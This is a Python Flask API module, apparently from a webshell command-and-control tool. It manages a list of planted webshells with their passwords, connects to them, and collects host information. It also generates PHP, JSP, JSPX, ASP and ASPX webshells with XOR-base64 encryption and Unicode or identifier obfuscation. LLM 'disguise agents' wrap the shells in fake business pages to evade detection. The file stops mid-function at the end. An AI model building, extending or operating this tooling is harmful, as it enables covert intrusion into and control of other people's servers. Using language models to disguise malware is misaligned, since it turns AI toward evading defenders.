#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
核心WebShell管理API

这个模块只负责与具体webshell操作无关的核心管理功能：
- webshell列表管理（增删查改）
- webshell连接管理
- webshell生成功能
- 缓存管理
"""

import secrets
import string
from flask import Blueprint, request, jsonify
import json
import os
import traceback
import uuid
import time
import re
import shutil
from urllib.parse import urlparse
import urllib3
import requests
from .shell_obfuscation import code_compress, jspx_obfuscation, Unicode_Obfuscation, patch_variable, repalce_content,xor_base64

from .shell_factory import (
    clear_webshell_cache,
    get_webshell_cache_status,
    get_supported_webshell_types,
    get_webshell_config_by_id,
    get_or_create_webshell_instance_by_id,
    is_webshell_instance_cached,
    remove_webshell_instance_by_id
)
from . import config as global_config

from .agent import (
    JspDisguiseAgent,
    JspxDisguiseAgent,
    PhpDisguiseAgent,
    PayloadAgentConfig,
)

AI_AGENT_MAP = {
    'jsp': (JspDisguiseAgent, 'jsp_filename'),
    'jspx': (JspxDisguiseAgent, 'jspx_filename'),
    'php': (PhpDisguiseAgent, 'php_filename'),
}

# 禁用不安全请求的警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 创建核心管理功能蓝图
core_management_bp = Blueprint('core_management', __name__, url_prefix='/api/webshell')

# 存储webshell列表的文件路径
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
WEBSHELL_LIST_FILE = os.path.join(DATA_DIR, 'webshell_list.json')

# 存储活跃的心跳线程
active_threads = {}

# 确保数据目录存在
os.makedirs(DATA_DIR, exist_ok=True)

# 获取webshell文件路径
WEBSHELL_FILE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'webshell')
NORMAL_TEMPLATE_PHP_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'webshell', 'php', 'normal_template')
NORMAL_TEMPLATE_JSP_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'webshell', 'jsp', 'normal_template')
NORMAL_TEMPLATE_JSPX_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'webshell', 'jspx', 'normal_template')
NORMAL_TEMPLATE_ASP_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'webshell', 'asp', 'normal_template')

TEMPLATE_DIRS = {
    'php': os.path.join(WEBSHELL_FILE_PATH, 'php'),
    'jsp': os.path.join(WEBSHELL_FILE_PATH, 'jsp'),
    'jspx': os.path.join(WEBSHELL_FILE_PATH, 'jspx'),
    'asp': os.path.join(WEBSHELL_FILE_PATH, 'asp'),
    'csharp': os.path.join(WEBSHELL_FILE_PATH, 'csharp')
}

DEFAULT_TEMPLATES = {
    'php': 'shell1.php',
    'jsp': 'shell1.jsp',
    'jspx': 'shell1.jspx',
    'asp': 'shell1.asp',
    'csharp': 'shell1.aspx'
}

TEMPLATE_EXTENSIONS = {
    'php': ('.php', '.txt'),
    'jsp': ('.jsp',),
    'jspx': ('.jspx',),
    'asp': ('.asp',),
    'csharp': ('.aspx',)
}

NORMAL_TEMPLATE_DIRS = {
    'php': NORMAL_TEMPLATE_PHP_PATH,
    'jsp': NORMAL_TEMPLATE_JSP_PATH,
    'jspx': NORMAL_TEMPLATE_JSPX_PATH,
    'asp': NORMAL_TEMPLATE_ASP_PATH
}

NORMAL_TEMPLATE_EXTENSIONS = {
    'php': ('.php',),
    'jsp': ('.jsp',),
    'jspx': ('.jspx',),
    'asp': ('.asp',),
    'csharp': ('.aspx',)
}

# AI 生成正常业务模板后的保存目录
# jsp/jspx 保存至原始 webshell 目录，php 保存至 normal_template 子目录
AI_TEMPLATE_SAVE_DIRS = {
    'jsp': TEMPLATE_DIRS['jsp'],
    'jspx': TEMPLATE_DIRS['jspx'],
    'php': NORMAL_TEMPLATE_PHP_PATH,
}




def list_template_files(webshell_type):
    """列出指定类型的模板文件"""
    template_dir = TEMPLATE_DIRS.get(webshell_type)
    if not template_dir or not os.path.isdir(template_dir):
        return []

    allowed_ext = TEMPLATE_EXTENSIONS.get(webshell_type, ())
    files = []
    for file_name in os.listdir(template_dir):
        file_path = os.path.join(template_dir, file_name)
        if os.path.isfile(file_path):
            if not allowed_ext or file_name.lower().endswith(allowed_ext):
                files.append(file_name)
    return sorted(files)


def get_template_path(webshell_type, template_name=None):
    """根据类型和模板名称获取模板文件路径"""
    template_dir = TEMPLATE_DIRS.get(webshell_type)
    if not template_dir or not os.path.isdir(template_dir):
        return None

    if template_name:
        safe_name = os.path.basename(template_name)
        candidate = os.path.join(template_dir, safe_name)
        if os.path.isfile(candidate):
            return candidate
        return None

    default_template = DEFAULT_TEMPLATES.get(webshell_type)
    if default_template:
        candidate = os.path.join(template_dir, default_template)
        if os.path.isfile(candidate):
            return candidate

    files = list_template_files(webshell_type)
    if files:
        return os.path.join(template_dir, files[0])
    return None


@core_management_bp.route('/template_files', methods=['GET'])
def get_webshell_templates():
    """获取指定类型的webshell模板文件列表"""
    try:
        webshell_type = request.args.get('type', 'jsp').lower()
        if webshell_type not in TEMPLATE_DIRS:
            return jsonify({'status': 'error', 'message': '不支持的webshell类型'}), 400

        templates = list_template_files(webshell_type)
        return jsonify({
            'status': 'success',
            'data': {
                'type': webshell_type,
                'templates': templates
            }
        })
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'获取模板列表失败: {str(e)}'
        }), 500


@core_management_bp.route('/normal_templates', methods=['GET'])
def get_normal_templates():
    """获取指定类型的模拟正常业务模板列表"""
    try:
        webshell_type = request.args.get('type', 'php').lower()
        if webshell_type not in NORMAL_TEMPLATE_DIRS:
            return jsonify({'status': 'error', 'message': '不支持的webshell类型'}), 400

        templates = list_normal_template_files(webshell_type)
        return jsonify({
            'status': 'success',
            'data': {
                'type': webshell_type,
                'templates': templates
            }
        })
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'获取模拟模板列表失败: {str(e)}'
        }), 500

@core_management_bp.route('/ai_generate_template', methods=['POST'])
def ai_generate_template():
    """使用 AI 生成正常业务伪装模板（支持 jsp / jspx / php）"""
    try:
        data = request.json or {}
        webshell_type = (data.get('webshell_type') or '').strip().lower()
        requirement = (data.get('requirement') or '').strip()

        if webshell_type not in AI_AGENT_MAP:
            return jsonify({'status': 'error', 'message': '仅支持 jsp / jspx / php 类型的 AI 模板生成'}), 400
        if not requirement:
            return jsonify({'status': 'error', 'message': '需求描述不能为空'}), 400

        llm_cfg = global_config.load_global_config().get('llm', {})
        provider = (llm_cfg.get('provider') or 'openai').strip()
        base_url = (llm_cfg.get('baseUrl') or '').strip()
        model_name = (llm_cfg.get('model') or '').strip()
        api_key = (llm_cfg.get('apiKey') or '').strip()
        temperature = float(llm_cfg.get('temperature', 0.1) or 0.1)
        max_compile_attempts = 3

        if not api_key:
            return jsonify({'status': 'error', 'message': 'LLM API Key 未配置，请先在 WebshellConfig 中保存 LLM 配置'}), 400
        if not model_name:
            return jsonify({'status': 'error', 'message': 'LLM 模型名称未配置，请先在 WebshellConfig 中保存 LLM 配置'}), 400
        if provider not in ['openai', 'codex_proxy', 'gemini_proxy']:
            return jsonify({'status': 'error', 'message': f'不支持的 LLM provider: {provider}'}), 400
        if provider in ('codex_proxy', 'gemini_proxy') and not base_url:
            return jsonify({'status': 'error', 'message': f'使用 {provider} 时必须配置 Base URL'}), 400

        agent_cls, filename_key = AI_AGENT_MAP[webshell_type]
        agent = agent_cls(
            PayloadAgentConfig(
                api_key=api_key,
                model_name=model_name,
                base_url=base_url or None,
                provider=provider,
                temperature=temperature,
                max_compile_attempts=max_compile_attempts,
            )
        )
        result = agent.run(requirement)

        generated_code = result.get('generated_code', '') or ''
        if not generated_code.strip():
            return jsonify({
                'status': 'error',
                'message': result.get('compile_message') or 'AI 未返回可用的模板代码',
            }), 400

        return jsonify({
            'status': 'success',
            'data': {
                'code': generated_code,
                'filename': result.get(filename_key, f'BusinessFacade.{webshell_type}'),
                'compile_success': result.get('compile_success', False),
                'compile_message': result.get('compile_message', ''),
            }
        })
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'AI 模板生成失败: {str(e)}'}), 500


@core_management_bp.route('/save_ai_template', methods=['POST'])
def save_ai_template():
    """将 AI 生成的正常业务模板保存至对应的 webshell 目录"""
    try:
        data = request.json or {}
        webshell_type = (data.get('webshell_type') or '').strip().lower()
        filename = (data.get('filename') or '').strip()
        code = data.get('code') or ''

        if webshell_type not in AI_TEMPLATE_SAVE_DIRS:
            return jsonify({'status': 'error', 'message': '仅支持 jsp / jspx / php 类型的模板保存'}), 400
        if not filename:
            return jsonify({'status': 'error', 'message': '文件名不能为空'}), 400
        if not code.strip():
            return jsonify({'status': 'error', 'message': '模板代码不能为空'}), 400

        # 防止路径穿越
        safe_name = os.path.basename(filename)
        expected_ext = f'.{webshell_type}'
        if not safe_name.lower().endswith(expected_ext):
            safe_name = safe_name + expected_ext

        save_dir = AI_TEMPLATE_SAVE_DIRS[webshell_type]
        os.makedirs(save_dir, exist_ok=True)
        save_path = os.path.join(save_dir, safe_name)

        with open(save_path, 'w', encoding='utf-8') as f:
            f.write(code)

        return jsonify({
            'status': 'success',
            'data': {
                'filename': safe_name,
                'saved_path': save_path,
            }
        })
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'保存模板失败: {str(e)}'}), 500


# ====== 工具函数 ======

def generate_letter_key(length: int) -> str:

    # 定义字符集：包含所有 ASCII 字母 (a-z, A-Z)
    alphabet = string.ascii_letters 
    
    # 使用 secrets.choice 从字符集中随机选择字符并拼接
    key = ''.join(secrets.choice(alphabet) for _ in range(length))
    
    return key

def get_file_content(file_path):
    """获取文件内容"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return f.read()
    except Exception as e:
        print(f"获取文件内容出错: {str(e)}")
        return None
    

def list_normal_template_files(webshell_type):
    """列出指定类型的模拟正常业务模板文件（不带扩展名）"""
    template_dir = NORMAL_TEMPLATE_DIRS.get(webshell_type)
    if not template_dir or not os.path.isdir(template_dir):
        return []

    allowed_ext = NORMAL_TEMPLATE_EXTENSIONS.get(webshell_type, ())
    files = []
    for file_name in os.listdir(template_dir):
        file_path = os.path.join(template_dir, file_name)
        if not os.path.isfile(file_path):
            continue

        lower_name = file_name.lower()
        if allowed_ext and not any(lower_name.endswith(ext) for ext in allowed_ext):
            continue

        base_name, _ = os.path.splitext(file_name)
        files.append(base_name)

    return sorted(files)


def get_normal_template_content(webshell_type, template_name):
    """获取模拟正常业务模板文件内容"""
    template_dir = NORMAL_TEMPLATE_DIRS.get(webshell_type)
    if not template_dir or not os.path.isdir(template_dir) or not template_name:
        return None

    safe_name = os.path.basename(template_name.strip())
    if not safe_name:
        return None

    allowed_ext = NORMAL_TEMPLATE_EXTENSIONS.get(webshell_type, ())
    name_root, ext = os.path.splitext(safe_name)

    candidate_names = []
    if ext:
        candidate_names.append(safe_name)
        if name_root:
            candidate_names.append(name_root)
    else:
        candidate_names.append(safe_name)

    # 去重保持顺序
    seen = set()
    ordered_candidates = []
    for name in candidate_names:
        if name and name not in seen:
            ordered_candidates.append(name)
            seen.add(name)

    for candidate in ordered_candidates:
        # 先尝试原始名称
        candidate_path = os.path.join(template_dir, candidate)
        if os.path.isfile(candidate_path):
            return get_file_content(candidate_path)

        # 再尝试追加合法扩展名
        for extension in allowed_ext:
            if candidate.lower().endswith(extension):
                continue
            candidate_path = os.path.join(template_dir, f"{candidate}{extension}")
            if os.path.isfile(candidate_path):
                return get_file_content(candidate_path)

    return None

def load_webshell_list():
    """加载webshell列表"""
    if os.path.exists(WEBSHELL_LIST_FILE):
        try:
            with open(WEBSHELL_LIST_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            print(f"加载webshell列表出错: {str(e)}")
    return []


def save_webshell_list(webshell_list):
    """保存webshell列表"""
    try:
        with open(WEBSHELL_LIST_FILE, 'w', encoding='utf-8') as f:
            json.dump(webshell_list, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print(f"保存webshell列表出错: {str(e)}")
        return False


def check_webshell_status(url):
    """检查webshell状态"""
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return 'online'
        else:
            return 'offline'
    except Exception as e:
        print(f"[DEBUG] 检查webshell状态出错: {str(e)}")
        return 'offline'


def guess_system_type(url):
    """根据URL和其他信息猜测系统类型"""
    try:
        # 解析URL
        parsed_url = urlparse(url)
        host = parsed_url.hostname
        
        # 基于主机名的简单判断
        if host and ('windows' in host.lower() or 'win' in host.lower()):
            return 'Windows'
        elif host and ('linux' in host.lower() or 'unix' in host.lower()):
            return 'Linux'
        
        # 基于文件扩展名判断
        if url.endswith('.asp') or url.endswith('.aspx'):
            return 'Windows'  # ASP通常运行在Windows上
        elif url.endswith('.php'):
            return 'Linux'    # PHP更常见于Linux
        elif url.endswith('.jsp'):
            return 'Unknown'  # JSP可以运行在多种系统上
        
        return 'Unknown'
    except Exception as e:
        print(f"[DEBUG] 猜测系统类型出错: {str(e)}")
        return 'Unknown'


def detect_system_type_by_path(current_dir):
    """
    根据当前目录路径判断系统类型。
    将 WSL 路径 (如 /mnt/c/) 正确识别为 Linux。
    """
    if not isinstance(current_dir, str) or not current_dir:
        return 'Unknown'
    
    # 1. 优先识别原生 Windows 路径
    # 特征: 包含'\'或以'盘符:'开头 (例如 'C:')
    if '\\' in current_dir or re.match(r'^[a-zA-Z]:', current_dir):
        return 'Windows'
    
    # 2. 识别 macOS 特有路径
    if current_dir.startswith('/System/') or current_dir.startswith('/Applications/'):
        return 'macOS'
        
    # 3. 识别所有类 Unix 路径 (包括 Linux 和 WSL)
    # 只要路径以'/'开头，并且不符合上述macOS的特征，就认为是Linux
    if current_dir.startswith('/'):
        return 'Linux'
        
    return 'Unknown'



# ====== WebShell列表管理 ======

@core_management_bp.route('/list', methods=['GET'])
def get_webshell_list():
    """获取webshell列表"""
    try:
        webshell_list = load_webshell_list()
        for webshell in webshell_list:
            webshell.pop('customJsonTemplate', None)
        return jsonify({
            'status': 'success',
            'data': webshell_list
        })
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器内部错误: {str(e)}'
        }), 500


@core_management_bp.route('/globalConfig', methods=['GET'])
def get_global_config():
    """获取全局配置"""
    try:
        cfg = global_config.load_global_config()
        return jsonify({'status': 'success', 'data': cfg})
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'获取配置失败: {str(e)}'}), 500


@core_management_bp.route('/globalConfig', methods=['POST'])
def set_global_config():
    """保存全局配置"""
    try:
        data = request.json or {}
        cfg = global_config.normalize_global_config(data)
        if not global_config.save_global_config(cfg):
            return jsonify({'status': 'error', 'message': '保存配置失败'}), 500
        return jsonify({'status': 'success', 'message': '配置已保存', 'data': cfg})
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'保存配置失败: {str(e)}'}), 500


@core_management_bp.route('/save', methods=['POST'])
def save_webshell():
    """添加或更新webshell"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        # -------- 参数解析与校验 --------
        def _get(field, default=None):
            return data.get(field, default)

        incoming = {
            'url': _get('url', '').strip(),
            'password': _get('password', ''),
            'paramName': _get('paramName', ''),
            'proxyHost': _get('proxyHost', ''),
            'proxyType': _get('proxyType', 'none'),
            'webshellType': _get('webshellType', 'jsp'),
            'encryptType': _get('encryptType', 'aes_base64'),
            'requestFormat': _get('requestFormat', 'plain'),
            'requestFormatFile': _get('requestFormatFile', ''),
            'cookieName': _get('cookieName', 'X-Request-ID'),
        }
        request_format_content = _get('requestFormatContent', '')

        # 基础必填校验
        if not incoming['url']:
            return jsonify({'status': 'error', 'message': 'Webshell URL不能为空'}), 400
        if not incoming['password']:
            return jsonify({'status': 'error', 'message': 'Webshell密码不能为空'}), 400
        if not incoming['paramName']:
            return jsonify({'status': 'error', 'message': 'Webshell参数名不能为空'}), 400
        if not incoming['cookieName']:
            return jsonify({'status': 'error', 'message': 'Cookie名称不能为空'}), 400

        # 合法性校验
        if incoming['proxyType'] not in ['none', 'http', 'socks']:
            return jsonify({'status': 'error', 'message': '无效的代理类型'}), 400
        if incoming['webshellType'] not in ['php', 'jsp', 'asp', 'csharp']:
            return jsonify({'status': 'error', 'message': '无效的webshell类型'}), 400
        valid_encrypt_types = [
            'xor_base64', 'xor_base64_json', 'xor_raw', 'xor_raw_png',
            'aes_base64', 'aes_base64_json', 'aes_raw', 'aes_raw_png',
            'eval_xor_base64', 'eval_base64', 'eval_aes_base64'
        ]
        if incoming['encryptType'] not in valid_encrypt_types:
            return jsonify({'status': 'error', 'message': f'不支持的加密类型: {incoming["encryptType"]}'}), 400

        # -------- 读取/更新列表 --------
        webshell_list = load_webshell_list()
        webshell_id = data.get('id')

        def config_changed(old_item, new_item):
            keys = [
                'url', 'password', 'paramName', 'proxyHost', 'proxyType',
                'webshellType', 'encryptType',
                'requestFormat', 'requestFormatFile', 'cookieName'
            ]
            return any(old_item.get(k) != new_item.get(k) for k in keys)

        if webshell_id:
            # 更新
            for i, webshell in enumerate(webshell_list):
                if webshell['id'] == webshell_id:
                    changed = config_changed(webshell, incoming)
                    if changed:
                        print("[*] Webshell配置发生变化，生成新ID并清除旧实例")
                        from .shell_factory import remove_webshell_instance
                        try:
                            remove_webshell_instance(
                                webshell.get('url'),
                                webshell.get('paramName'),
                                webshell.get('password')
                            )
                            print("[*] 已清除旧webshell实例缓存")
                        except Exception as e:
                            print(f"[!] 清除旧webshell实例缓存时出错: {str(e)}")

                        # 删除旧请求格式文件
                        old_request_format_file = webshell.get('requestFormatFile')
                        if old_request_format_file:
                            old_format_file_path = os.path.join(DATA_DIR, old_request_format_file)
                            try:
                                if os.path.exists(old_format_file_path):
                                    os.remove(old_format_file_path)
                                    print(f"[*] 已删除旧的请求格式文件: {old_format_file_path}")
                            except Exception as e:
                                print(f"[!] 删除旧的请求格式文件时出错: {str(e)}")

                        new_webshell_id = str(uuid.uuid4())
                        webshell_id = new_webshell_id
                        print(f"[*] 生成新的webshell ID: {new_webshell_id}")

                    # 更新对象
                    webshell_list[i].update({
                        'id': webshell_id,
                        **incoming,
                        'systemType': guess_system_type(incoming['url']) if changed else webshell.get('systemType', 'Unknown'),
                        'updated_at': int(time.time())
                    })
                    webshell_list[i].pop('customJsonTemplate', None)
                    break
        else:
            # 新增，校验重复
            for webshell in webshell_list:
                if webshell['url'] == incoming['url'] and webshell['paramName'] == incoming['paramName']:
                    return jsonify({'status': 'error', 'message': '该webshell已存在'}), 400

            new_webshell = {
                'id': str(uuid.uuid4()),
                **incoming,
                'systemType': guess_system_type(incoming['url']),
                'status': 'offline',
                'created_at': int(time.time()),
                'updated_at': int(time.time())
            }
            webshell_list.append(new_webshell)

        # -------- 保存列表 --------
        if not save_webshell_list(webshell_list):
            return jsonify({'status': 'error', 'message': '保存失败'}), 500

        final_webshell_id = webshell_id if webshell_id else new_webshell['id']

        # -------- 处理自定义请求格式文件 --------
        if request_format_content.strip():
            try:
                format_filename = f"{final_webshell_id}_request_format_define.json"
                format_file_path = os.path.join(DATA_DIR, format_filename)
                parsed_content = json.loads(request_format_content)
                with open(format_file_path, 'w', encoding='utf-8') as f:
                    json.dump(parsed_content, f, ensure_ascii=False, indent=2)

                # 回写文件名
                webshell_list = load_webshell_list()
                for webshell in webshell_list:
                    if webshell['id'] == final_webshell_id:
                        webshell['requestFormatFile'] = format_filename
                        webshell['updated_at'] = int(time.time())
                        break
                save_webshell_list(webshell_list)
                print(f"[*] 保存自定义请求格式内容到文件: {format_file_path}")

            except json.JSONDecodeError as e:
                print(f"[ERROR] 请求格式内容JSON格式错误: {e}")
                return jsonify({'status': 'error', 'message': 'JSON格式错误'}), 400
            except Exception as e:
                print(f"[ERROR] 保存请求格式内容失败: {e}")
                return jsonify({'status': 'error', 'message': f'保存请求格式内容失败: {str(e)}'}), 500

        response_data = {'id': final_webshell_id}
        if data.get('id') and data.get('id') != response_data['id']:
            response_data['id_changed'] = True
            response_data['old_id'] = data.get('id')
            response_data['new_id'] = response_data['id']
            print(f"[*] 返回新ID信息给前端: 旧ID={response_data['old_id']}, 新ID={response_data['new_id']}")

        return jsonify({
            'status': 'success',
            'message': '保存成功',
            'data': response_data
        })
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器内部错误: {str(e)}'
        }), 500


@core_management_bp.route('/delete/<string:webshell_id>', methods=['DELETE'])
def delete_webshell(webshell_id):
    """删除webshell"""
    try:
        from .shell_factory import remove_webshell_instance
        
        webshell_list = load_webshell_list()
        
        # 查找并删除指定ID的webshell
        for i, webshell in enumerate(webshell_list):
            if webshell['id'] == webshell_id:
                # 删除对应的缓存实例（支持所有类型的webshell）
                remove_webshell_instance(webshell['url'], webshell['paramName'], webshell['password'])
                
                del webshell_list[i]
                
                # 保存更新后的列表
                if save_webshell_list(webshell_list):
                    return jsonify({
                        'status': 'success',
                        'message': '删除成功'
                    })
                else:
                    return jsonify({'status': 'error', 'message': '保存失败'}), 500
                
        # 如果没有找到指定ID
        return jsonify({'status': 'error', 'message': '找不到指定的webshell'}), 404
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器内部错误: {str(e)}'
        }), 500


@core_management_bp.route('/check/<string:webshell_id>', methods=['GET'])
def check_status(webshell_id):
    """检查webshell状态"""
    try:
        webshell_list = load_webshell_list()
        
        # 查找指定ID的webshell
        for webshell in webshell_list:
            if webshell['id'] == webshell_id:
                # 检查状态
                status = check_webshell_status(webshell['url'])
                
                # 更新状态
                webshell['status'] = status
                webshell['updated_at'] = int(time.time())
                
                # 保存更新后的列表
                save_webshell_list(webshell_list)
                
                return jsonify({
                    'status': 'success',
                    'data': {
                        'webshell_id': webshell_id,
                        'webshell_status': status
                    }
                })
        
        # 如果没有找到指定ID
        return jsonify({'status': 'error', 'message': '找不到指定的webshell'}), 404
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器内部错误: {str(e)}'
        }), 500


@core_management_bp.route('/detail/<string:webshell_id>', methods=['GET'])
def get_webshell_detail(webshell_id):
    """获取单个webshell详情"""
    try:
        webshell_list = load_webshell_list()
        
        # 查找指定ID的webshell
        for webshell in webshell_list:
            if webshell['id'] == webshell_id:
                webshell.pop('customJsonTemplate', None)
                return jsonify({
                    'status': 'success',
                    'data': webshell
                })
        
        # 如果没有找到指定ID
        return jsonify({'status': 'error', 'message': '找不到指定的webshell'}), 404
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器内部错误: {str(e)}'
        }), 500


# ====== WebShell连接管理 ======

@core_management_bp.route('/openWebshell', methods=['POST'])
def openWebshell():
    """打开webshell连接"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 获取webshell_id参数（用户建议的极简方案）
        webshell_id = data.get('webshell_id')
        
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400

        print(f"[DEBUG] 使用webshell_id创建实例: {webshell_id}")

        was_cached = is_webshell_instance_cached(webshell_id)

        # 使用极简接口创建webshell实例
        
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({
                'status': 'error',
                'message': 'Webshell初始化失败'
            })
        
        test_passed = shell.test()

        # 如果test失败且之前存在缓存，则先清理该缓存并重新初始化
        if not test_passed and was_cached:
            if remove_webshell_instance_by_id(webshell_id):
                print(f"[DEBUG] test失败，清理缓存实例后重新初始化: {webshell_id}")
                shell = get_or_create_webshell_instance_by_id(webshell_id)
                if shell:
                    test_passed = shell.test()

        if not test_passed or not shell:
            return jsonify({
                'status': 'error',
                'message': 'test命令执行失败'
            })
        
        system_info = shell.get_basic_info()
        if not system_info:
            return jsonify({
                'status': 'error',
                'message': '获取系统信息失败'
            })
        
        # 根据CurrentDir路径判断系统类型
        current_dir = system_info.get('CurrentDir', '')
        detected_system_type = detect_system_type_by_path(current_dir)
        
        print(f"[DEBUG] 检测到的当前目录: {current_dir}")
        print(f"[DEBUG] 判断的系统类型: {detected_system_type}")
        
        # 更新webshell列表中的系统类型（通过webshell_id直接匹配）
        webshell_list = load_webshell_list()
        updated = False
        for webshell in webshell_list:
            if webshell['id'] == webshell_id:
                # 更新系统类型和状态
                webshell['systemType'] = detected_system_type
                webshell['status'] = 'online'
                webshell['updated_at'] = int(time.time())
                updated = True
                break
        
        if updated:
            save_webshell_list(webshell_list)
        
        # 在系统信息中添加检测到的系统类型
        system_info['DetectedSystemType'] = detected_system_type
        
        return jsonify({
            'status': 'success',
            'message': 'Webshell连接成功',
            'data': system_info
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器内部错误: {str(e)}'
        }), 500


@core_management_bp.route('/keepAlive', methods=['POST'])
def keep_alive():
    """保持webshell连接活跃"""
    pass

# ====== WebShell生成功能 ======

@core_management_bp.route('/generate_webshell', methods=['POST'])
def generate_webshell():
    """生成webshell,返回webshell内容"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        param_name = data.get('param_name')
        webshell_type = data.get('webshell_type')
        template_name = data.get('template_name')
        obfuscation_method = data.get('obfuscation_method')
        keywords = data.get('keywords') or []
        unicode_ratio = data.get('unicode_ratio')
        html_ratio = data.get('html_ratio')
        identifier_replace_method = data.get('identifier_replace_method')
        identifier_replace_prefix = data.get('identifier_replace_prefix')
        normal_template = (data.get('normal_template') or '').strip()
        cookie_name = data.get('cookie_name')
        if isinstance(cookie_name, str):
            cookie_name = cookie_name.strip()
        # 默认值按类型区分：PHP 常见 PHPSESSID，其它类型默认 JSESSIONID
        cookie_name = cookie_name or ('PHPSESSID' if (webshell_type or '').lower() == 'php' else 'JSESSIONID')
        use_normal_template = bool(normal_template and normal_template.lower() != 'none')
        class_name = data.get('class_name')

        if isinstance(webshell_type, str):
            webshell_type = webshell_type.lower().strip()

        supported_types = set(TEMPLATE_DIRS.keys())
        if webshell_type not in supported_types:
            return jsonify({'status': 'error', 'message': '不支持的webshell类型'}), 400

        if webshell_type == 'csharp':
            if isinstance(class_name, str):
                class_name = class_name.strip()
            if not class_name:
                return jsonify({'status': 'error', 'message': 'csharp 类型必须提供 class_name'}), 400
            # 允许命名空间：Namespace.Sub.Class
            if not re.match(r'^[A-Za-z_][A-Za-z0-9_]*(\.[A-Za-z_][A-Za-z0-9_]*)*$', class_name):
                return jsonify({'status': 'error', 'message': 'class_name 格式不合法'}), 400

        if not param_name or not webshell_type:
            return jsonify({'status': 'error', 'message': 'param_name和webshell_type不能为空'}), 400
        
        print(f"[DEBUG] 要生成webshell的参数名: {param_name}，类型: {webshell_type}")
        webshell_content = None

        # 获取webshell模板文件的内容
        template_path = get_template_path(webshell_type, template_name)
        if not template_path:
            return jsonify({'status': 'error', 'message': '模板文件不存在或不可用'}), 400
        webshell_content = get_file_content(template_path)
        
        # 修改标识符
        if identifier_replace_method and identifier_replace_prefix:
            webshell_content = patch_variable(webshell_content, identifier_replace_method, identifier_replace_prefix)

        if webshell_type == 'php':
            webshell_content = repalce_content(webshell_content, {"$param$": param_name, "$cookie_name$": cookie_name})
            if use_normal_template:
                template_content = get_normal_template_content(webshell_type, normal_template)
                if not template_content:
                    return jsonify({'status': 'error', 'message': '模拟正常业务模板不存在或不可读取'}), 400

                secret_key = generate_letter_key(16)
                payload_content = xor_base64(webshell_content, secret_key)
                webshell_content = repalce_content(template_content, {"$cookie_name$": cookie_name, "$secret_key$": secret_key, "$payload$": payload_content})

        elif webshell_type == 'jsp':
            webshell_content = repalce_content(webshell_content, {"$param$": param_name, "$cookie_name$": cookie_name})
            webshell_content = code_compress(webshell_content)       
            if obfuscation_method != 'none' and obfuscation_method == 'unicode':
                webshell_content = Unicode_Obfuscation(
                        webshell_content,
                        keywords,
                        unicode_ratio
                )
                
        elif webshell_type == 'jspx':
            webshell_content = repalce_content(webshell_content, {"$param$": param_name})
            webshell_content = code_compress(webshell_content)
            if obfuscation_method and obfuscation_method != 'none':
                webshell_content = jspx_obfuscation(
                    webshell_content,
                    keywords,
                    obfuscation_method,
                    unicode_ratio,
                    html_ratio
                )
        elif webshell_type == 'asp':
            webshell_content = repalce_content(webshell_content, {"$param$": param_name, "$cookie_name$": cookie_name})

        elif webshell_type == 'csharp':
            # 1) 优先支持模板内的占位符
            webshell_content = repalce_content(
                webshell_content,
                {"$param$": param_name, "$cookie_name$": cookie_name, "$class_name$": class_name}
            )
            # 2) 兼容旧模板：默认 CreateInstance("GKD") 写死
            #    仅替换常见形式，避免误伤其他字符串
            webshell_content = repalce_content(
                webshell_content,
                {
                    'CreateInstance("GKD")': f'CreateInstance("{class_name}")',
                    "CreateInstance('GKD')": f"CreateInstance('{class_name}')",
                }
            )
            webshell_content = code_compress(webshell_content)
            

        return jsonify({
            'status': 'success',
            'message': 'Webshell生成成功',
            'data': webshell_content
        })
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器内部错误: {str(e)}'
        }), 500



# ====== 缓存管理 ======

@core_management_bp.route('/clearCache', methods=['POST'])
def clear_cache():
    """清空所有缓存的webshell实例"""
    try:
        count = clear_webshell_cache()
        return jsonify({
            'status': 'success',
            'message': f'缓存清理成功，共清理 {count} 个实例'
        })
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'清理缓存失败: {str(e)}'
        }), 500


@core_management_bp.route('/clearCacheById', methods=['POST'])
def clear_cache_by_id():
    """清理指定webshell实例的缓存"""
    try:
        data = request.json
        if not data:
